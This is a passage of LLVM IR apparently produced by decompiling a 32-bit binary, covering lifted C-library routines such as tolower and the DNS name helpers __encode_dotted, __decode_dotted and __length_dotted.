  store i32 %v1_8056ea0, i32* %esi.global-to-local, align 4
  %tmp16 = icmp ult i32 %v1_8056ea0, -4095
  br i1 %tmp16, label %dec_label_pc_8056eba, label %dec_label_pc_8056eac

dec_label_pc_8056eac:                             ; preds = %entry
  %v1_8056eac = call i32 @__errno_location(i32 %arg3)
  %v0_8056eb1 = load i32, i32* %esi.global-to-local, align 4
  %v1_8056eb1 = sub i32 0, %v0_8056eb1
  %v2_8056eb3 = inttoptr i32 %v1_8056eac to i32*
  store i32 %v1_8056eb1, i32* %v2_8056eb3, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8056ebe

dec_label_pc_8056eba:                             ; preds = %entry
  %v1_8056eba = icmp eq i32 %v1_8056ea0, 0
  br i1 %v1_8056eba, label %dec_label_pc_8056ec3, label %dec_label_pc_8056ebe

dec_label_pc_8056ebe:                             ; preds = %dec_label_pc_8056eba, %dec_label_pc_8056eac
  %v0_8056ebe = phi i32 [ %v1_8056ea0, %dec_label_pc_8056eba ], [ -1, %dec_label_pc_8056eac ]
  %v1_8056ec0 = ashr i32 %v0_8056ebe, 31
  br label %dec_label_pc_8056ecb

dec_label_pc_8056ec3:                             ; preds = %dec_label_pc_8056eba
  %v3_8056ec3 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8056ecb

dec_label_pc_8056ecb:                             ; preds = %dec_label_pc_8056ebe, %dec_label_pc_8056ec3
  %v0_8056ed1 = phi i32 [ %v0_8056ebe, %dec_label_pc_8056ebe ], [ %v3_8056ec3, %dec_label_pc_8056ec3 ]
  %storemerge = phi i32 [ %v1_8056ec0, %dec_label_pc_8056ebe ], [ %tmp, %dec_label_pc_8056ec3 ]
  store i32 %storemerge, i32* @edx, align 4
  %v2_8056ece = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8056ece, i32* @ebx, align 4
  ret i32 %v0_8056ed1

; uselistorder directives
  uselistorder i32 %v1_8056ea0, { 1, 2, 0, 3 }
  uselistorder i32 31, { 21, 16, 22, 28, 29, 23, 24, 12, 3, 4, 1, 2, 11, 27, 17, 18, 19, 7, 8, 5, 6, 13, 9, 10, 25, 26, 20, 14, 15, 0 }
  uselistorder i32 (i32)* @__errno_location, { 58, 48, 71, 70, 69, 47, 46, 57, 56, 45, 25, 42, 55, 40, 18, 50, 24, 37, 13, 12, 11, 10, 9, 68, 8, 23, 22, 7, 21, 53, 52, 60, 59, 67, 66, 65, 36, 20, 19, 51, 17, 41, 39, 38, 54, 0, 44, 43, 14, 49, 6, 5, 35, 32, 31, 64, 29, 4, 16, 1, 28, 15, 63, 62, 34, 27, 26, 61, 3, 2, 72, 33, 30 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_8056ecb, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_8056ed8 = add i32 %arg1, 128
  %v6_8056ee3 = icmp ugt i32 %v1_8056ed8, 383
  br i1 %v6_8056ee3, label %dec_label_pc_8056eee, label %dec_label_pc_8056ee5

dec_label_pc_8056ee5:                             ; preds = %entry
  %v0_8056ee5 = load i32, i32* bitcast (i32** @global_var_8062540.721 to i32*), align 64
  %v2_8056eea = mul i32 %arg1, 2
  %v3_8056eea = add i32 %v0_8056ee5, %v2_8056eea
  %v4_8056eea = inttoptr i32 %v3_8056eea to i16*
  %v5_8056eea = load i16, i16* %v4_8056eea, align 2
  %v6_8056eea = sext i16 %v5_8056eea to i32
  store i32 %v6_8056eea, i32* @edx, align 4
  br label %dec_label_pc_8056eee

dec_label_pc_8056eee:                             ; preds = %entry, %dec_label_pc_8056ee5
  %v0_8056eee = phi i32 [ %arg1, %entry ], [ %v6_8056eea, %dec_label_pc_8056ee5 ]
  ret i32 %v0_8056eee

; uselistorder directives
  uselistorder i32 65536, { 1, 0, 2, 3, 4, 6, 5, 8, 7, 10, 9, 12, 11, 13, 14, 64, 67, 15, 16, 17, 66, 19, 18, 20, 21, 22, 23, 24, 27, 28, 26, 25, 29, 30, 31, 32, 35, 36, 34, 33, 37, 40, 39, 38, 41, 42, 43, 44, 45, 46, 47, 48, 50, 49, 51, 52, 55, 56, 57, 53, 58, 54, 60, 59, 61, 63, 62, 65 }
  uselistorder i32 128, { 18, 9, 11, 3, 10, 4, 5, 12, 0, 6, 7, 13, 14, 15, 16, 17, 2, 1, 8, 19 }
  uselistorder label %dec_label_pc_8056eee, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8056ef5 = load i32, i32* @edi, align 4
  %v0_8056ef6 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_8056efd = ptrtoint i8* %arg1 to i32
  store i32 %v4_8056efd, i32* @edi, align 4
  %v1_8056f5c6 = icmp eq i8* %arg1, null
  br i1 %v1_8056f5c6, label %dec_label_pc_8056f65, label %dec_label_pc_8056f60.lr.ph

dec_label_pc_8056f60.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8056f60

dec_label_pc_8056f03:                             ; preds = %dec_label_pc_8056f60
  %v5_8056f08 = call i32 @__GI_strchr(i8* %v1_8056f60, i32 46)
  %v1_8056f10 = icmp eq i32 %v5_8056f08, 0
  br i1 %v1_8056f10, label %dec_label_pc_8056f1c, label %dec_label_pc_8056f16

dec_label_pc_8056f16:                             ; preds = %dec_label_pc_8056f03
  %v1_8056f18 = load i32, i32* @edi, align 4
  %v2_8056f18 = sub i32 %v5_8056f08, %v1_8056f18
  br label %dec_label_pc_8056f2a

dec_label_pc_8056f1c:                             ; preds = %dec_label_pc_8056f03
  %v0_8056f1f = load i32, i32* @edi, align 4
  %v5_8056f1f = inttoptr i32 %v0_8056f1f to i8*
  %v3_8056f20 = call i32 @strlen(i8* %v5_8056f1f)
  br label %dec_label_pc_8056f2a

dec_label_pc_8056f2a:                             ; preds = %dec_label_pc_8056f16, %dec_label_pc_8056f1c
  %v0_8056f3d = phi i32 [ %v3_8056f20, %dec_label_pc_8056f1c ], [ %v2_8056f18, %dec_label_pc_8056f16 ]
  store i32 %v0_8056f3d, i32* @esi, align 4
  %v1_8056f2a = icmp eq i32 %v0_8056f3d, 0
  %v3_8056f2a = trunc i32 %v0_8056f3d to i8
  br i1 %v1_8056f2a, label %dec_label_pc_8056f79, label %dec_label_pc_8056f2e

dec_label_pc_8056f2e:                             ; preds = %dec_label_pc_8056f2a
  %v1_8056f32 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056f32 = sub i32 %arg3, %v1_8056f32
  %v1_8056f34 = add i32 %v2_8056f32, -1
  %v7_8056f35 = icmp ult i32 %v0_8056f3d, %v1_8056f34
  %v1_8056f37 = icmp eq i1 %v7_8056f35, false
  br i1 %v1_8056f37, label %dec_label_pc_8056f79, label %dec_label_pc_8056f39

dec_label_pc_8056f39:                             ; preds = %dec_label_pc_8056f2e
  store i32 %arg2, i32* @edx, align 4
  %v4_8056f3f = add i32 %v1_8056f32, %arg2
  %v5_8056f3f = inttoptr i32 %v4_8056f3f to i8*
  store i8 %v3_8056f2a, i8* %v5_8056f3f, align 1
  %v0_8056f42 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056f42 = add i32 %v0_8056f42, 1
  %v0_8056f44 = load i32, i32* @edx, align 4
  %v0_8056f46 = load i32, i32* @esi, align 4
  %v2_8056f47 = add i32 %v1_8056f42, %v0_8056f44
  %v0_8056f49 = load i32, i32* @edi, align 4
  %v2_8056f4a = add i32 %v0_8056f46, %v1_8056f42
  store i32 %v2_8056f4a, i32* %ebx.global-to-local, align 4
  %tmp31 = inttoptr i32 %v2_8056f47 to i16*
  %v7_8056f4d = call i32 @memcpy(i16* %tmp31, i32 %v0_8056f49, i32 %v0_8056f46)
  %v1_8056f59 = add i32 %v5_8056f08, 1
  br i1 %v1_8056f10, label %dec_label_pc_8056f65, label %dec_label_pc_8056f5c

dec_label_pc_8056f5c:                             ; preds = %dec_label_pc_8056f39
  store i32 %v1_8056f59, i32* @edi, align 4
  %v1_8056f5c = icmp eq i32 %v1_8056f59, 0
  br i1 %v1_8056f5c, label %dec_label_pc_8056f65, label %dec_label_pc_8056f60

dec_label_pc_8056f60:                             ; preds = %dec_label_pc_8056f60.lr.ph, %dec_label_pc_8056f5c
  %v0_8056f07 = phi i32 [ %v4_8056efd, %dec_label_pc_8056f60.lr.ph ], [ %v1_8056f59, %dec_label_pc_8056f5c ]
  %v1_8056f60 = inttoptr i32 %v0_8056f07 to i8*
  %v2_8056f60 = load i8, i8* %v1_8056f60, align 1
  %v3_8056f60 = icmp eq i8 %v2_8056f60, 0
  %v1_8056f63 = icmp eq i1 %v3_8056f60, false
  br i1 %v1_8056f63, label %dec_label_pc_8056f03, label %dec_label_pc_8056f65

dec_label_pc_8056f65:                             ; preds = %dec_label_pc_8056f5c, %dec_label_pc_8056f60, %dec_label_pc_8056f39, %entry
  %tmp32 = icmp slt i32 %arg3, 1
  br i1 %tmp32, label %dec_label_pc_8056f79, label %dec_label_pc_8056f6c

dec_label_pc_8056f6c:                             ; preds = %dec_label_pc_8056f65
  %v1_8056f70 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056f70 = add i32 %v1_8056f70, %arg2
  %v3_8056f70 = inttoptr i32 %v2_8056f70 to i8*
  store i8 0, i8* %v3_8056f70, align 1
  %v0_8056f74 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056f74 = add i32 %v0_8056f74, 1
  br label %dec_label_pc_8056f7c

dec_label_pc_8056f79:                             ; preds = %dec_label_pc_8056f2e, %dec_label_pc_8056f2a, %dec_label_pc_8056f65
  br label %dec_label_pc_8056f7c

dec_label_pc_8056f7c:                             ; preds = %dec_label_pc_8056f6c, %dec_label_pc_8056f79
  %storemerge4 = phi i32 [ %v1_8056f74, %dec_label_pc_8056f6c ], [ -1, %dec_label_pc_8056f79 ]
  store i32 %v0_8056ef6, i32* @esi, align 4
  store i32 %v0_8056ef5, i32* @edi, align 4
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i8* %v1_8056f60, { 1, 0 }
  uselistorder i32 %v1_8056f59, { 0, 2, 1 }
  uselistorder i32 %v0_8056f46, { 1, 0 }
  uselistorder i32 %v5_8056f08, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @strlen, { 4, 7, 6, 3, 2, 1, 0, 5, 8 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 8, 9, 10, 0, 1, 2, 3, 4, 5, 6, 7, 11, 12 }
  uselistorder i32 46, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i8* null, { 4, 3, 2, 7, 0, 1, 6, 8, 9, 5, 10, 11, 12 }
  uselistorder label %dec_label_pc_8056f7c, { 1, 0 }
  uselistorder label %dec_label_pc_8056f79, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056f65, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8056f60, { 1, 0 }
  uselistorder label %dec_label_pc_8056f2a, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_8056f86 = load i32, i32* @esi, align 4
  %v4_8056f8b = icmp eq i32 %arg1, 0
  store i32 %arg2, i32* @edx, align 4
  br i1 %v4_8056f8b, label %dec_label_pc_8057052, label %dec_label_pc_8056f9a

dec_label_pc_8056f9a:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_805703a2541 = add i32 %arg2, %arg1
  %v3_805703a2642 = inttoptr i32 %v2_805703a2541 to i8*
  %v4_805703a2743 = load i8, i8* %v3_805703a2642, align 1
  %v1_805703e2945 = icmp eq i8 %v4_805703a2743, 0
  %v1_80570403046 = icmp eq i1 %v1_805703e2945, false
  br i1 %v1_80570403046, label %dec_label_pc_8056fa8.lr.ph, label %dec_label_pc_8057046

dec_label_pc_8056fa8:                             ; preds = %dec_label_pc_8056fa8.lr.ph, %dec_label_pc_8056fc1
  %v0_8056fb2 = phi i32 [ %v0_8056fb2.pre, %dec_label_pc_8056fa8.lr.ph ], [ %v4_8056fd2, %dec_label_pc_8056fc1 ]
  %v8_8056fa837 = phi i1 [ %v8_8056fa83151, %dec_label_pc_8056fa8.lr.ph ], [ true, %dec_label_pc_8056fc1 ]
  %v5_805703a36.in = phi i8 [ %v5_805703a2850.in, %dec_label_pc_8056fa8.lr.ph ], [ %v4_805703a, %dec_label_pc_8056fc1 ]
  %stack_var_-17.135 = phi i8 [ %stack_var_-17.1.ph49, %dec_label_pc_8056fa8.lr.ph ], [ 0, %dec_label_pc_8056fc1 ]
  %v0_8056faf34 = phi i32 [ %v0_8056faf.ph47, %dec_label_pc_8056fa8.lr.ph ], [ %v2_8056fe0, %dec_label_pc_8056fc1 ]
  %v5_805703a36 = zext i8 %v5_805703a36.in to i32
  %v1_8056faf = add i32 %v0_8056faf34, 1
  store i32 %v1_8056faf, i32* @esi, align 4
  %v3_8056fb2 = select i1 %v8_8056fa837, i32 2, i32 1
  %v4_8056fb2 = add i32 %v3_8056fb2, %v0_8056fb2
  store i32 %v4_8056fb2, i32* %ebp.global-to-local, align 4
  %v1_8056fb5 = and i32 %v5_805703a36, 192
  %v6_8056fba = icmp eq i32 %v1_8056fb5, 192
  %v1_8056fbf = icmp eq i1 %v6_8056fba, false
  br i1 %v1_8056fbf, label %dec_label_pc_8056fe4, label %dec_label_pc_8056fc1

dec_label_pc_8056fc1:                             ; preds = %dec_label_pc_8056fa8
  %v2_8056fce = add i32 %v1_8056faf, %arg1
  %v3_8056fce = inttoptr i32 %v2_8056fce to i8*
  %v4_8056fce = load i8, i8* %v3_8056fce, align 1
  %v5_8056fce = zext i8 %v4_8056fce to i32
  %v4_8056fd2 = add i32 %v3_8056fb2, %v4_8056fb2
  store i32 %v4_8056fd2, i32* %ebp.global-to-local, align 4
  %v1_8056fd5 = mul nuw nsw i32 %v5_805703a36, 256
  %v2_8056fd8 = and i32 %v1_8056fd5, 16128
  %v2_8056fe0 = or i32 %v5_8056fce, %v2_8056fd8
  store i32 %v2_8056fe0, i32* @edx, align 4
  store i32 %v1_8057001.ph48, i32* @ecx, align 4
  %v2_805703a = add i32 %v2_8056fe0, %arg1
  %v3_805703a = inttoptr i32 %v2_805703a to i8*
  %v4_805703a = load i8, i8* %v3_805703a, align 1
  %v1_805703e = icmp eq i8 %v4_805703a, 0
  %v1_8057040 = icmp eq i1 %v1_805703e, false
  br i1 %v1_8057040, label %dec_label_pc_8056fa8, label %dec_label_pc_8057046

dec_label_pc_8056fe4:                             ; preds = %dec_label_pc_8056fa8
  %v2_8056fe4 = add i32 %v5_805703a36, %v1_8057001.ph48
  %v1_8056fe9 = add i32 %v2_8056fe4, 1
  store i32 %v1_8056fe9, i32* @edi, align 4
  %v10_8056fea = icmp ult i32 %v1_8056fe9, %arg4
  %v1_8056ff2 = icmp eq i1 %v10_8056fea, false
  br i1 %v1_8056ff2, label %dec_label_pc_8057052, label %dec_label_pc_8056ff4

dec_label_pc_8056ff4:                             ; preds = %dec_label_pc_8056fe4
  %v2_8056ffa = add i32 %v1_8056faf, %arg1
  %v2_8057001 = add i32 %v1_8057001.ph48, %arg3
  %v3_8057004 = inttoptr i32 %v2_8057001 to i16*
  %v4_8057004 = call i32 @memcpy(i16* %v3_8057004, i32 %v2_8056ffa, i32 %v5_805703a36)
  %v0_8057010 = load i32, i32* %ebp.global-to-local, align 4
  %v0_8057019 = load i32, i32* @esi, align 4
  %v2_8057019 = add i32 %v0_8057019, %v5_805703a36
  store i32 %v2_8057019, i32* @edx, align 4
  %v1_8057020 = icmp eq i1 %v8_8056fa837, false
  %v2_8057010 = select i1 %v1_8057020, i32 %v5_805703a36, i32 0
  %v4_8057020 = add i32 %v0_8057010, %v2_8057010
  store i32 %v4_8057020, i32* %ebp.global-to-local, align 4
  %v4_8057031 = add i32 %v2_8056fe4, %arg3
  %v5_8057031 = inttoptr i32 %v4_8057031 to i8*
  store i8 46, i8* %v5_8057031, align 1
  %v0_8057034.pre = load i32, i32* @edi, align 4
  %v1_805703a.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_8057034.pre, i32* @ecx, align 4
  %v2_805703a25 = add i32 %v1_805703a.pre.pre, %arg1
  %v3_805703a26 = inttoptr i32 %v2_805703a25 to i8*
  %v4_805703a27 = load i8, i8* %v3_805703a26, align 1
  %v1_805703e29 = icmp eq i8 %v4_805703a27, 0
  %v1_805704030 = icmp eq i1 %v1_805703e29, false
  %v8_8056fa831 = icmp eq i8 %stack_var_-17.135, 0
  %v0_8056fb2.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_805704030, label %dec_label_pc_8056fa8.lr.ph, label %dec_label_pc_8057046

dec_label_pc_8056fa8.lr.ph:                       ; preds = %dec_label_pc_8056ff4, %dec_label_pc_8056f9a
  %v0_8056fb2.pre = phi i32 [ 0, %dec_label_pc_8056f9a ], [ %v0_8056fb2.pre.pre, %dec_label_pc_8056ff4 ]
  %v8_8056fa83151 = phi i1 [ false, %dec_label_pc_8056f9a ], [ %v8_8056fa831, %dec_label_pc_8056ff4 ]
  %v5_805703a2850.in = phi i8 [ %v4_805703a2743, %dec_label_pc_8056f9a ], [ %v4_805703a27, %dec_label_pc_8056ff4 ]
  %stack_var_-17.1.ph49 = phi i8 [ 1, %dec_label_pc_8056f9a ], [ %stack_var_-17.135, %dec_label_pc_8056ff4 ]
  %v1_8057001.ph48 = phi i32 [ 0, %dec_label_pc_8056f9a ], [ %v0_8057034.pre, %dec_label_pc_8056ff4 ]
  %v0_8056faf.ph47 = phi i32 [ %arg2, %dec_label_pc_8056f9a ], [ %v1_805703a.pre.pre, %dec_label_pc_8056ff4 ]
  br label %dec_label_pc_8056fa8

dec_label_pc_8057046:                             ; preds = %dec_label_pc_8056ff4, %dec_label_pc_8056fc1, %dec_label_pc_8056f9a
  %v0_805704b = phi i32 [ 0, %dec_label_pc_8056f9a ], [ %v4_8056fd2, %dec_label_pc_8056fc1 ], [ %v0_8056fb2.pre.pre, %dec_label_pc_8056ff4 ]
  %v8_8056fa8.lcssa = phi i1 [ false, %dec_label_pc_8056f9a ], [ true, %dec_label_pc_8056fc1 ], [ %v8_8056fa831, %dec_label_pc_8056ff4 ]
  %v2_805704d = zext i1 %v8_8056fa8.lcssa to i32
  %v3_805704d = add i32 %v0_805704b, 1
  %v4_805704d = add i32 %v3_805704d, %v2_805704d
  br label %dec_label_pc_8057055

dec_label_pc_8057052:                             ; preds = %dec_label_pc_8056fe4, %entry
  br label %dec_label_pc_8057055

dec_label_pc_8057055:                             ; preds = %dec_label_pc_8057046, %dec_label_pc_8057052
  %storemerge = phi i32 [ %v4_805704d, %dec_label_pc_8057046 ], [ -1, %dec_label_pc_8057052 ]
  store i32 %v0_8056f86, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8057001.ph48, { 2, 1, 0 }
  uselistorder i8 %v4_805703a, { 1, 0 }
  uselistorder i32 %v2_8056fe0, { 0, 2, 1 }
  uselistorder i32 %v4_8056fd2, { 0, 2, 1 }
  uselistorder i32 %v5_805703a36, { 2, 4, 1, 3, 5, 0 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i8 1, { 2, 15, 18, 5, 0, 17, 11, 1, 12, 13, 6, 7, 8, 9, 3, 4, 14, 16, 10 }
  uselistorder i8 46, { 3, 4, 2, 0, 5, 1 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 4, 5, 6, 7, 8, 9, 10, 17, 0, 1, 18, 19, 21, 15, 16, 11, 12, 13, 14, 20, 2, 3 }
  uselistorder i32* @edi, { 3, 189, 190, 21, 191, 192, 193, 20, 194, 195, 196, 2, 0, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 29, 5, 4, 30, 31, 32, 33, 34, 37, 35, 36, 212, 7, 213, 8, 214, 215, 6, 216, 217, 218, 219, 224, 225, 1, 220, 221, 222, 223, 226, 227, 228, 229, 108, 9, 109, 110, 111, 230, 231, 239, 240, 241, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 168, 169, 170, 171, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 10, 123, 124, 125, 126, 127, 128, 129, 344, 345, 346, 11, 347, 348, 351, 352, 301, 302, 303, 45, 46, 47, 353, 354, 369, 165, 12, 166, 167, 38, 39, 40, 41, 42, 43, 44, 180, 181, 182, 183, 184, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 48, 49, 50, 51, 52, 53, 54, 326, 327, 328, 329, 330, 331, 332, 333, 13, 334, 335, 336, 337, 338, 272, 273, 14, 274, 275, 276, 277, 278, 279, 280, 289, 290, 291, 292, 293, 130, 131, 15, 132, 367, 368, 133, 134, 135, 16, 250, 251, 242, 243, 244, 245, 246, 247, 248, 249, 55, 56, 57, 252, 253, 254, 136, 137, 138, 139, 140, 141, 142, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 17, 157, 26, 27, 28, 143, 18, 144, 145, 107, 363, 364, 365, 366, 255, 256, 257, 258, 259, 260, 158, 159, 160, 161, 232, 233, 234, 235, 236, 237, 238, 349, 350, 185, 186, 299, 300, 58, 59, 60, 304, 305, 360, 361, 362, 61, 19, 62, 63, 64, 65, 306, 307, 66, 67, 68, 355, 356, 357, 358, 359, 69, 70, 71, 74, 72, 73, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 162, 163, 164, 172, 173, 174, 175, 176, 177, 178, 179, 22, 23, 24, 25, 187, 188, 281, 282, 283, 284, 285, 286, 287, 288, 294, 295, 296, 297, 298, 308, 309, 310, 339, 340, 341, 342, 343 }
  uselistorder i32 256, { 5, 6, 7, 8, 9, 47, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 46, 21, 22, 23, 24, 25, 0, 1, 26, 2, 48, 27, 28, 54, 29, 30, 4, 51, 52, 3, 31, 32, 33, 34, 49, 35, 36, 37, 38, 39, 40, 41, 42, 50, 55, 43, 53, 44, 45 }
  uselistorder i1 true, { 2, 4, 9, 10, 11, 12, 13, 14, 3, 6, 7, 8, 0, 5, 1 }
  uselistorder i32* @edx, { 4, 176, 177, 178, 179, 180, 181, 182, 17, 186, 184, 185, 187, 188, 189, 190, 191, 192, 193, 45, 49, 46, 47, 48, 194, 195, 196, 197, 198, 199, 200, 207, 201, 202, 203, 204, 205, 206, 1, 18, 165, 108, 109, 208, 110, 111, 112, 113, 114, 222, 209, 210, 211, 226, 227, 228, 229, 356, 5, 2, 19, 166, 115, 116, 212, 213, 6, 214, 215, 216, 217, 117, 118, 119, 120, 121, 122, 425, 426, 427, 428, 7, 429, 430, 362, 174, 363, 52, 432, 50, 433, 364, 436, 437, 444, 443, 434, 157, 80, 158, 159, 160, 161, 162, 163, 51, 367, 368, 8, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 9, 382, 383, 365, 366, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 10, 68, 69, 70, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 11, 409, 410, 411, 412, 413, 439, 164, 230, 231, 233, 0, 183, 232, 355, 123, 218, 219, 220, 71, 221, 124, 125, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 16, 143, 144, 126, 145, 12, 146, 147, 149, 13, 150, 151, 152, 153, 154, 44, 14, 148, 435, 223, 224, 225, 15, 155, 357, 358, 431, 175, 438, 354, 440, 424, 72, 359, 360, 73, 351, 361, 74, 441, 442, 75, 76, 77, 78, 79, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 156, 167, 168, 169, 170, 171, 172, 173, 20, 21, 22, 24, 25, 23, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 37, 36, 38, 39, 40, 41, 42, 43, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 352, 353, 414, 415, 416, 417, 419, 423, 418, 421, 422, 3, 420, 445 }
  uselistorder i32* @esi, { 252, 253, 254, 255, 256, 257, 37, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 38, 53, 54, 10, 5, 61, 55, 58, 56, 57, 6, 59, 60, 278, 11, 279, 280, 283, 281, 282, 290, 284, 285, 286, 287, 288, 289, 291, 292, 293, 294, 295, 296, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 12, 149, 150, 13, 303, 304, 306, 305, 7, 307, 308, 331, 332, 333, 334, 335, 336, 0, 39, 337, 338, 339, 340, 341, 342, 231, 232, 233, 234, 235, 395, 396, 397, 398, 343, 344, 151, 152, 153, 14, 154, 155, 156, 157, 158, 159, 160, 363, 364, 365, 73, 74, 75, 399, 400, 401, 402, 403, 411, 414, 415, 416, 222, 223, 224, 225, 226, 227, 228, 404, 409, 410, 62, 63, 64, 65, 66, 67, 245, 246, 247, 1, 248, 249, 250, 68, 69, 70, 71, 72, 366, 371, 15, 372, 373, 374, 375, 376, 377, 378, 367, 368, 369, 370, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 16, 390, 40, 391, 392, 393, 394, 345, 346, 347, 350, 351, 352, 353, 354, 355, 356, 357, 358, 417, 17, 418, 419, 161, 18, 162, 41, 34, 348, 349, 361, 362, 229, 230, 426, 427, 163, 164, 165, 166, 167, 168, 169, 319, 19, 8, 309, 313, 314, 315, 316, 20, 35, 317, 318, 310, 311, 312, 91, 21, 92, 93, 320, 22, 321, 322, 170, 171, 172, 173, 24, 174, 2, 176, 177, 178, 179, 23, 180, 181, 175, 182, 183, 184, 185, 3, 186, 187, 188, 189, 190, 191, 192, 36, 25, 193, 194, 26, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 27, 212, 213, 214, 28, 52, 195, 4, 196, 197, 29, 30, 138, 405, 406, 407, 408, 420, 421, 422, 423, 424, 425, 323, 324, 325, 326, 31, 327, 328, 329, 330, 215, 216, 217, 218, 297, 298, 299, 300, 32, 33, 301, 302, 412, 413, 359, 360, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 107, 105, 106, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 9, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 219, 220, 221, 236, 237, 238, 239, 240, 241, 242, 243, 244, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 251, 428 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_8057055, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_805706e = icmp eq i32 %arg1, 0
  br i1 %v1_805706e, label %dec_label_pc_805709d, label %dec_label_pc_805708e.preheader

dec_label_pc_805708e.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_805708e10 = add i32 %arg2, %arg1
  %v3_805708e11 = inttoptr i32 %v2_805708e10 to i8*
  %v4_805708e12 = load i8, i8* %v3_805708e11, align 1
  %v1_805709214 = add i32 %arg2, 1
  %v1_805709515 = icmp eq i8 %v4_805708e12, 0
  %v1_805709716 = icmp eq i1 %v1_805709515, false
  br i1 %v1_805709716, label %dec_label_pc_805707d, label %dec_label_pc_8057099

dec_label_pc_8057074:                             ; preds = %dec_label_pc_805707d
  %v1_8057074 = add i32 %v0_805707417, 2
  br label %dec_label_pc_8057099

dec_label_pc_805707d:                             ; preds = %dec_label_pc_805708e.preheader, %dec_label_pc_805708e
  %v1_805709219 = phi i32 [ %v1_8057092, %dec_label_pc_805708e ], [ %v1_805709214, %dec_label_pc_805708e.preheader ]
  %v5_805708e18.in = phi i8 [ %v4_805708e, %dec_label_pc_805708e ], [ %v4_805708e12, %dec_label_pc_805708e.preheader ]
  %v0_805707417 = phi i32 [ %v2_805708b, %dec_label_pc_805708e ], [ %arg2, %dec_label_pc_805708e.preheader ]
  %v5_805708e18 = zext i8 %v5_805708e18.in to i32
  %v1_805707f = and i32 %v5_805708e18, 192
  %v6_8057084 = icmp eq i32 %v1_805707f, 192
  %v2_805708b = add i32 %v5_805708e18, %v1_805709219
